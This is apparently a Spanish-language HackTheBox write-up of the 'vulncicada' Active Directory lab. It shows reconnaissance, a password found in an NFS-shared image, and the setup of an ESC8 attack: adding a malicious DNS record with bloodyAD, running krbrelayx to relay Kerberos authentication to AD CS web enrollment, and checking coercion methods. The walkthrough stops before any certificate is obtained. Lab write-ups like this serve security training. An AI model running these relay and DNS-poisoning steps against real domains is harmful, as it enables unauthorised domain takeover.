Propiedades:
- OS: Windows
- Plataforma: HackTheBox
- Nivel: Medium
- Tags: #ad #certipy #certificates #ESC8 #kerberos-relay #petitpotam #nfs #bloodyad #krbrelayx

![](assets/Pasted%20image%2020260107181945.png)

## Reconocimiento

Comienzo tirando un ping para comprobar conectividad.

```bash
┌──(wndr㉿wndr)-[~]
└─$ ping -c 1 10.129.234.48
PING 10.129.234.48 (10.129.234.48) 56(84) bytes of data.
64 bytes from 10.129.234.48: icmp_seq=1 ttl=127 time=86.3 ms

--- 10.129.234.48 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 86.253/86.253/86.253/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/vulncicada]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.234.48 -oG nmap/allPorts

Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
111/tcp   open  rpcbind          syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
2049/tcp  open  nfs              syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
53197/tcp open  unknown          syn-ack ttl 127
53199/tcp open  unknown          syn-ack ttl 127
53215/tcp open  unknown          syn-ack ttl 127
53277/tcp open  unknown          syn-ack ttl 127
53737/tcp open  unknown          syn-ack ttl 127
```

Sobre los puertos abiertos tiro un segundo escaneo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/vulncicada]
└─$ sudo nmap -p 53,80,88,111,135,139,389,445,464,593,636,2049,3268,3269,3389,9389,49664,49667,53197,53199,53215,53277,53737 -sV -sC -Pn -n -sS --min-rate 5000 -vvv 10.129.234.48 -oN nmap/target

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-08 00:31:35Z)
111/tcp   open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-08T00:18:00
| Not valid after:  2027-01-08T00:18:00
| MD5:   c376:33e0:fda7:50ec:f029:3b91:5939:7f80
| SHA-1: f7b5:917f:c305:495c:a370:b9b0:ca5e:78a7:4b68:38ef
| -----BEGIN CERTIFICATE-----
| MIIGQjCCBSqgAwIBAgITdAAAAFc7aZIjprzimAAcAAAAVzANBgkqhkiG9w0BAQsF
| ADBKMRIwEAYKCZImiZPyLGQBGRYCdmwxFjAUBgoJkiaJk/IsZAEZFgZjaWNhZGEx
| HDAaBgNVBAMTE2NpY2FkYS1EQy1KUFEyMjUtQ0EwHhcNMjYwMTA4MDAxODAwWhcN
| MjcwMTA4MDAxODAwWjAeMRwwGgYDVQQDExNEQy1KUFEyMjUuY2ljYWRhLnZsMIIB
| IjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3S/Kf5x+FUWNtAX0fTV6Ry95
| C9xX9H6dn/X2hnK9EpNLnYkce1gxS2Qh6caMBoFwvyxZNsmKOBi6Wq7ahrMnaVS8
| iGjkrtyySU2aMm+EcqqPTB/5MIqWX+xsJZaWWhhqWYAt6t9ivFEGlzecOmZPTrrf
| cLgbAEYad9HQgB9K45OOZ+NoFZCbdyoP+zQ/XXdmJxfhaRGUyQGZ+zCJKsJbjDWI
| <MAS..>
| CtJGgIDgH/dsOj4MBz8ArS8313HXAw==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-08T00:18:00
| Not valid after:  2027-01-08T00:18:00
| MD5:   c376:33e0:fda7:50ec:f029:3b91:5939:7f80
| SHA-1: f7b5:917f:c305:495c:a370:b9b0:ca5e:78a7:4b68:38ef
| -----BEGIN CERTIFICATE-----
| MIIGQjCCBSqgAwIBAgITdAAAAFc7aZIjprzimAAcAAAAVzANBgkqhkiG9w0BAQsF
| ADBKMRIwEAYKCZImiZPyLGQBGRYCdmwxFjAUBgoJkiaJk/IsZAEZFgZjaWNhZGEx
| HDAaBgNVBAMTE2NpY2FkYS1EQy1KUFEyMjUtQ0EwHhcNMjYwMTA4MDAxODAwWhcN
| MjcwMTA4MDAxODAwWjAeMRwwGgYDVQQDExNEQy1KUFEyMjUuY2ljYWRhLnZsMIIB
| IjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3S/Kf5x+FUWNtAX0fTV6Ry95
| C9xX9H6dn/X2hnK9EpNLnYkce1gxS2Qh6caMBoFwvyxZNsmKOBi6Wq7ahrMnaVS8
|<MAS.....>
| CtJGgIDgH/dsOj4MBz8ArS8313HXAw==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
2049/tcp  open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-08T00:18:00
| Not valid after:  2027-01-08T00:18:00
| MD5:   c376:33e0:fda7:50ec:f029:3b91:5939:7f80
| SHA-1: f7b5:917f:c305:495c:a370:b9b0:ca5e:78a7:4b68:38ef
| -----BEGIN CERTIFICATE-----
| MIIGQjCCBSqgAwIBAgITdAAAAFc7aZIjprzimAAcAAAAVzANBgkqhkiG9w0BAQsF
| ADBKMRIwEAYKCZImiZPyLGQBGRYCdmwxFjAUBgoJkiaJk/IsZAEZFgZjaWNhZGEx
| HDAaBgNVBAMTE2NpY2FkYS1EQy1KUFEyMjUtQ0EwHhcNMjYwMTA4MDAxODAwWhcN
| MjcwMTA4MDAxODAwWjAeMRwwGgYDVQQDExNEQy1KUFEyMjUuY2ljYWRhLnZsMIIB
| IjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3S/Kf5x+FUWNtAX0fTV6Ry95
| <MAS...>
| CtJGgIDgH/dsOj4MBz8ArS8313HXAw==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-08T00:18:00
| Not valid after:  2027-01-08T00:18:00
| MD5:   c376:33e0:fda7:50ec:f029:3b91:5939:7f80
| SHA-1: f7b5:917f:c305:495c:a370:b9b0:ca5e:78a7:4b68:38ef
| -----BEGIN CERTIFICATE-----
| MIIGQjCCBSqgAwIBAgITdAAAAFc7aZIjprzimAAcAAAAVzANBgkqhkiG9w0BAQsF
| ADBKMRIwEAYKCZImiZPyLGQBGRYCdmwxFjAUBgoJkiaJk/IsZAEZFgZjaWNhZGEx
| HDAaBgNVBAMTE2NpY2FkYS1EQy1KUFEyMjUtQ0EwHhcNMjYwMTA4MDAxODAwWhcN
| MjcwMTA4MDAxODAwWjAeMRwwGgYDVQQDExNEQy1KUFEyMjUuY2ljYWRhLnZsMIIB
| IjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3S/Kf5x+FUWNtAX0fTV6Ry95
| C9xX9H6dn/X2hnK9EpNLnYkce1gxS2Qh6caMBoFwvyxZNsmKOBi6Wq7ahrMnaVS8
| iGjkrtyySU2aMm+EcqqPTB/5MIqWX+xsJZaWWhhqWYAt6t9ivFEGlzecOmZPTrrf
| <MAS..>
| CtJGgIDgH/dsOj4MBz8ArS8313HXAw==
|_-----END CERTIFICATE-----
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Issuer: commonName=DC-JPQ225.cicada.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-07T00:25:37
| Not valid after:  2026-07-09T00:25:37
| MD5:   ab5a:d80b:9ca4:3dd7:4c28:ea5a:1353:740b
| SHA-1: 3268:baca:f42b:c0d7:d7e8:97da:07a4:50fd:1350:6601
| -----BEGIN CERTIFICATE-----
| MIIC6jCCAdKgAwIBAgIQEgw3vModOrtBvOrVJzEQjDANBgkqhkiG9w0BAQsFADAe
| MRwwGgYDVQQDExNEQy1KUFEyMjUuY2ljYWRhLnZsMB4XDTI2MDEwNzAwMjUzN1oX
| DTI2MDcwOTAwMjUzN1owHjEcMBoGA1UEAxMTREMtSlBRMjI1LmNpY2FkYS52bDCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKoYPkXw3vWWZ76XMlovznjg
| /PvVKOUnxaLBMKVNiOHWTopUR6eeT8ufe34lSTcO3mMXC3YiukSwwyqO4UZLfSKc
|<MAS..>
| Y/EzyHfjh+mH9cqPqF24Cf5G0lVztPzZi433XzpX
|_-----END CERTIFICATE-----
|_ssl-date: 2026-01-08T00:33:10+00:00; +1s from scanner time.
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
53197/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
53199/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
53215/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
53277/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
53737/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-01-08T00:32:34
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 18435/tcp): CLEAN (Timeout)
|   Check 2 (port 37026/tcp): CLEAN (Timeout)
|   Check 3 (port 21688/udp): CLEAN (Timeout)
|   Check 4 (port 41279/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

```

## Enumeración

### Puerto 2049 NFS

NFS es un servicio de compartición de recursos a nivel de red, similar a SMB.

- Aqui podemos ver que el DC esta compartiendo un recurso /profiles el cual nos podemos montar e inspeccionar.

```bash
┌──(wndr㉿wndr)-[~/Tools]
└─$ showmount -e 10.129.234.48
Export list for 10.129.234.48:
/profiles (everyone)
```

Me voy a crear un directorio y me voy a montar los recursos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/vulncicada/content]
└─$ sudo mount -t nfs 10.129.234.48:/ ./targetNFS/ -o nolock
```

Esto es lo que podemos ver:

```bash
┌──(wndr㉿wndr)-[~/…/hackthebox/vulncicada/content/targetNFS]
└─$ tree
.
└── profiles
    ├── Administrator
    │   ├── Documents  [error opening dir]
    │   └── vacation.png
    ├── Daniel.Marshall
    ├── Debra.Wright
    ├── Jane.Carter
    ├── Jordan.Francis
    ├── Joyce.Andrews
    ├── Katie.Ward
    ├── Megan.Simpson
    ├── Richard.Gibbons
    ├── Rosie.Powell
    │   ├── Documents  [error opening dir]
    │   └── marketing.png
    └── Shirley.West

15 directories, 2 files
```

- Al parecer podemos ver los directorios home de distintos usuarios e imágenes de algunos.

Al abrir ambas imágenes encontré algo interesante en **Rosie.Powell/marketing.png**

```
┌──(wndr㉿wndr)-[~/…/vulncicada/content/targetNFS/profiles]
└─$ sudo open Rosie.Powell/marketing.png
```

![](assets/Pasted%20image%2020260107191657.png)

- Al parecer es una contraseña en un post it: **Cicada123**

Podemos probar estas credenciales pidiendo un `TGT`.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/vulncicada/loot]
└─$ impacket-getTGT cicada.vl/rosie.powell:Cicada123 -dc-ip 10.129.234.48
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in rosie.powell.ccache
```

- Conseguimos un TGT para el usuario rosie.

### Puerto 88 Kerberos.

Con Kerbrute podemos validar los usuarios que encontramos en el NFS.

```bash
┌──(wndr㉿wndr)-[~/Tools]
└─$ ./kerbrute userenum --dc 10.129.234.48 -d cicada.vl /home/wndr/Machines/hackthebox/vulncicada/users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 01/08/26 - Ronnie Flathers @ropnop

2026/01/08 00:57:42 >  Using KDC(s):
2026/01/08 00:57:42 >   10.129.234.48:88

2026/01/08 00:57:42 >  [+] VALID USERNAME:       Administrator@cicada.vl
2026/01/08 00:57:42 >  [+] VALID USERNAME:       Jordan.Francis@cicada.vl
2026/01/08 00:57:42 >  [+] VALID USERNAME:       Richard.Gibbons@cicada.vl
2026/01/08 00:57:42 >  [+] VALID USERNAME:       Megan.Simpson@cicada.vl
2026/01/08 00:57:42 >  [+] VALID USERNAME:       Katie.Ward@cicada.vl
2026/01/08 00:57:42 >  [+] VALID USERNAME:       Daniel.Marshall@cicada.vl
2026/01/08 00:57:42 >  [+] VALID USERNAME:       Joyce.Andrews@cicada.vl
2026/01/08 00:57:42 >  [+] VALID USERNAME:       Debra.Wright@cicada.vl
2026/01/08 00:57:42 >  [+] VALID USERNAME:       Jane.Carter@cicada.vl
2026/01/08 00:57:42 >  [+] VALID USERNAME:       Rosie.Powell@cicada.vl
```

- Todos son validos.

### Puerto 139,445 SMB

SMB nos indica que la autenticación por NTLM esta deshabilitada:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/vulncicada]
└─$ nxc smb 10.129.234.48
SMB         10.129.234.48   445    10.129.234.48    [*]  x64 (name:10.129.234.48) (domain:10.129.234.48) (signing:True) (SMBv1:False) (NTLM:False)


┌──(wndr㉿wndr)-[~/Machines/hackthebox/vulncicada]
└─$ nxc smb 10.129.234.48 -u 'guest' -p '' --shares
SMB         10.129.234.48   445    10.129.234.48    [*]  x64 (name:10.129.234.48) (domain:10.129.234.48) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.234.48   445    10.129.234.48    [-] 10.129.234.48\guest: STATUS_NOT_SUPPORTED
```

Podemos enumerar los shares con nuestras credenciales autenticándonos por kerberos.

- Rosie.Powell / Cicada123

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/vulncicada/loot]
└─$ nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k --shares
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] Enumerated shares
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Share           Permissions     Remark
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        -----           -----------     ------
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        ADMIN$                          Remote Admin
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        C$                              Default share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        CertEnroll      READ            Active Directory Certificate Services share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        IPC$            READ            Remote IPC
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        NETLOGON        READ            Logon server share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        profiles$       READ,WRITE
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        SYSVOL          READ            Logon server share
```

- CertEnroll este relacionado con ADCS.

Puedo enumerar ese share con el `TGT` que genere anteriormente.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/vulncicada/loot]
└─$ KRB5CCNAME=rosie.powell.ccache impacket-smbclient -k DC-JPQ225.cicada.vl

# shares
ADMIN$
C$
CertEnroll
IPC$
NETLOGON
profiles$
SYSVOL
# use CertEnroll
# ls
drw-rw-rw-          0  Thu Jan  8 00:31:49 2026 .
drw-rw-rw-          0  Fri Sep 13 15:17:59 2024 ..
-rw-rw-rw-        741  Thu Jan  8 00:26:31 2026 cicada-DC-JPQ225-CA(1)+.crl
-rw-rw-rw-        941  Thu Jan  8 00:26:31 2026 cicada-DC-JPQ225-CA(1).crl
-rw-rw-rw-        742  Thu Jan  8 00:26:30 2026 cicada-DC-JPQ225-CA(10)+.crl
-rw-rw-rw-        943  Thu Jan  8 00:26:30 2026 cicada-DC-JPQ225-CA(10).crl
-rw-rw-rw-        742  Thu Jan  8 00:26:30 2026 cicada-DC-JPQ225-CA(11)+.crl
-rw-rw-rw-        943  Thu Jan  8 00:26:30 2026 cicada-DC-JPQ225-CA(11).crl
-rw-rw-rw-        742  Thu Jan  8 00:26:30 2026 cicada-DC-JPQ225-CA(12)+.crl
-rw-rw-rw-        943  Thu Jan  8 00:26:30 2026 cicada-DC-JPQ225-CA(12).crl
-rw-rw-rw-        742  Thu Jan  8 00:26:30 2026 cicada-DC-JPQ225-CA(13)+.crl
-rw-rw-rw-        943  Thu Jan  8 00:26:30 2026 cicada-DC-JPQ225-CA(13).crl
-rw-rw-rw-        742  Thu Jan  8 00:26:30 2026 cicada-DC-JPQ225-CA(14)+.crl
-rw-rw-rw-        943  Thu Jan  8 00:26:30 2026 cicada-DC-JPQ225-CA(14).crl
-rw-rw-rw-        742  Thu Jan  8 00:26:30 2026 cicada-DC-JPQ225-CA(15)+.crl
-rw-rw-rw-        943  Thu Jan  8 00:26:30 2026 cicada-DC-JPQ225-CA(15).crl
-rw-rw-rw-        742  Thu Jan  8 00:26:30 2026 cicada-DC-JPQ225-CA(16)+.crl
-rw-rw-rw-        943  Thu Jan  8 00:26:30 2026 cicada-DC-JPQ225-CA(16).crl
-rw-rw-rw-        742  Thu Jan  8 00:26:30 2026 cicada-DC-JPQ225-CA(17)+.crl
-rw-rw-rw-        943  Thu Jan  8 00:26:30 2026 cicada-DC-JPQ225-CA(17).crl
-rw-rw-rw-        742  Thu Jan  8 00:26:30 2026 cicada-DC-JPQ225-CA(18)+.crl
-rw-rw-rw-        943  Thu Jan  8 00:26:30 2026 cicada-DC-JPQ225-CA(18).crl
-rw-rw-rw-        742  Thu Jan  8 00:26:30 2026 cicada-DC-JPQ225-CA(19)+.crl
-rw-rw-rw-        943  Thu Jan  8 00:26:30 2026 cicada-DC-JPQ225-CA(19).crl
```

- Hay un montón de llaves publicas que no necesariamente me sirven.
## Intrusion abusando de ESC8

Probé varios vectores que no funcionaron, como:

- Kerberoasting
- AS-REP Roasting 

Por lo cual ahora voy a tratar de enumerar certificados vulnerables con `certipy`.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/vulncicada/loot]
└─$ certipy find -target DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: DC-JPQ225.cicada.vl.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'cicada-DC-JPQ225-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'cicada-DC-JPQ225-CA'
[*] Checking web enrollment for CA 'cicada-DC-JPQ225-CA' @ 'DC-JPQ225.cicada.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Serial Number           : 19FB400E9B13A2B4416C79A7246E3C19
    Certificate Validity Start          : 2026-01-08 00:21:39+00:00
    Certificate Validity End            : 2526-01-08 00:31:39+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates
```

- La Autoridad Certificadora `cicada-DC-JPQ225-CA` es vulnerable a ESC8 debido a que el servicio de Web Enrollment está habilitado sobre HTTP, lo que permite ataques de NTLM relay contra AD CS.

[Certipy Wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) define los pasos para la explotación de ESC8 como los siguientes:

!!! quote
    **Coerción de Autenticación**: El atacante fuerza a una cuenta privilegiada a autenticarse mediante NTLM contra una máquina controlada por el atacante. Los objetivos más comunes de esta coerción son las cuentas de máquina de los Controladores de Dominio (por ejemplo, utilizando herramientas como PetitPotam o Coercer, u otras técnicas de coerción basadas en RPC como MS‑EFSRPC, MS‑RPRN, etc.) o cuentas de usuarios privilegiados como Domain Admin (por ejemplo, mediante phishing u otras técnicas de ingeniería social que provoquen una autenticación NTLM).

    **Configuración del NTLM Relay**: El atacante utiliza una herramienta de NTLM relay, como el comando `relay` de Certipy, para escuchar autenticaciones NTLM entrantes.

    **Relé de Autenticación**: Cuando la cuenta víctima se autentica contra la máquina del atacante, Certipy captura este intento de autenticación NTLM entrante y lo reenvía (relay) al endpoint vulnerable de inscripción web de AD CS (por ejemplo, `https://<servidor_ca>/certsrv/certfnsh.asp`).

    **Suplantación y Solicitud del Certificado**: El servicio web de AD CS, al recibir lo que considera una autenticación NTLM legítima de la cuenta privilegiada retransmitida, procesa las solicitudes de inscripción realizadas por Certipy como si provinieran de dicha cuenta privilegiada. Certipy solicita entonces un certificado, normalmente indicando una plantilla para la cual la cuenta suplantada tiene permisos de inscripción (por ejemplo, la plantilla `DomainController` si se relaya una cuenta de máquina de un DC, o la plantilla `User` por defecto para una cuenta de usuario).

    **Obtención del Certificado**: La Autoridad Certificadora (CA) emite el certificado. Certipy, actuando como intermediario, recibe dicho certificado.

    **Uso del Certificado para Acceso Privilegiado**: El atacante puede usar este certificado (por ejemplo, en un archivo `.pfx`) junto con `certipy auth` para autenticarse como la cuenta privilegiada suplantada mediante Kerberos PKINIT, lo que potencialmente conduce a un compromiso total del dominio.

    — Fuente: Certipy Wiki (ESC8)

El único cambio que vamos a hacer es que no vamos a relayear la autenticación NTLM si no mas bien la de Kerberos.

### Envenenamiento DNS mediante un registro malicioso

El primer paso en envenenar el DNS para añadir un nuevo registro que apunte a nuestro Host.

- Este paso es importante ya que es el que nos va a permitir forzar la autenticación.
- Este registro hace que cuando el DC intente conectarse a dicho hostname lo resuelva a mi IP.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/vulncicada/loot]
└─$ bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA 10.10.15.110

[+] dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA has been successfully added
```

- **Resultado:** El registro DNS ha sido añadido exitosamente. Ahora cualquier intento de resolución de ese nombre apuntará a nuestra IP (10.10.15.110).

### Kerberos Relay a ADCS

Ahora con con `krbelayx` vamos a levantar nuestro servicio `SMB` para capturar y relayear la autenticación de kerberos.

- Funciona como servidor smb.
- Intercepta la autenticación kerberos entrante.
- Relayea (Reenvía) la autenticación hacia el servicio de Web Enrollment de ADCS
- Solicita un certificado usando la plantilla DomainController

```bash
┌──(wndr㉿wndr)-[~/Tools/krbrelayx]
└─$ ./krbrelayx.py -t http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp --adcs --template DomainController -smb2support -v 'DC-JPQ225$'

[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMB loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server

[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server
[*] Servers started, waiting for connections
```

- Lo ideal es que cuando todo el ataque sea efectuado, `krbrelayx` generara un certificado para la cuenta `DC-JPQ225$` (la cuenta de máquina del Domain Controller)

Ahora necesitamos una forma de forzar la autenticación contra nuestro servidor fake. 

- Hay distintas formas de hacer esto y con `netexec` podemos ver cuales nos sirven.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/vulncicada/loot]
└─$ netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, DFSCoerce
